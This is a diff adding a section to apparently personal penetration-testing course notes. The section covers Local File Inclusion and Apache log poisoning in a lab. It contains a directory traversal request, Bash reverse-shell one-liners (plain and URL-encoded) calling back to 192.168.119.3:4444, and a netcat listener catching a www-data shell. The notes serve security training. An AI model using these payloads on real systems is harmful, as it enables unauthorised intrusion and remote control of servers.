@@ -1042,3 +1042,73 @@ offsec@68b68f3eb343:~$
 > IIS web server:\
 > `C:\inetpub\wwwroot\web.config`
 
+## File Inclusion Vulnerabilities
+> 1. How to exploit a Local File Inclusion (LFI) vulnerability\
+> 2. Analyze the differences between File Inclusion and Directory Traversal vulnerabilities
+
+### 1. Local File Inclusion (LFI)
+>[!Caution]
+> - `Directory traversal`
+> only allows us to read the contents of a file    
+> - `File inclusion`
+> we can use file inclusion vulnerabilities to execute local or remote files, can also display the file contents of non-executable files.
+>
+> Goal: **obtain Remote Code Execution (RCE) via an LFI vulnerability**  
+
+#### Case study: Executable code to Apache's access.log file in the /var/log/apache2/ directory
+##### (1) review what information is controlled by us and saved by Apache in the related log
+Log entry of Apache's access.log
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+...
+192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
+...
+```
+> User Agent is included in the log entry
+>> Modify the User Agent in Burp and specify what will be written to the access.log file
+    
+##### (2) modify the User Agent to include the PHP code snippet of the following listing
+![image](https://hackmd.io/_uploads/HJaO4Fuzyl.png)
+
+##### (3) enter a command for the PHP snippet & remove the User Agent line
+![image](https://hackmd.io/_uploads/rJJ0rY_zkx.png)
+> executed ps command that was written to the access.log 
+
+##### (4) **get a reverse shell or add our SSH key to the authorized_keys file for a user**
+- Bash TCP reverse shell one-liner:
+```
+bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
+```
+>[!Important]
+> Since we'll execute our command through the `PHP system function`, we should be aware that the command may be executed via the `Bourne Shell (sh)`.    
+- sh rather than Bash
+```
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+```
+![image](https://hackmd.io/_uploads/rJWddFuGkg.png)
+![image](https://hackmd.io/_uploads/B1osOKuf1e.png)
+
+- URL encoded Bash TCP reverse shell one-liner
+```
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+```
+##### (5) netcat listene & send request
+![image](https://hackmd.io/_uploads/B1_QFYuzJl.png)
+
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
+bash: cannot set terminal process group (24): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@fbea640f9802:/var/www/html/meteor$ ls
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+```
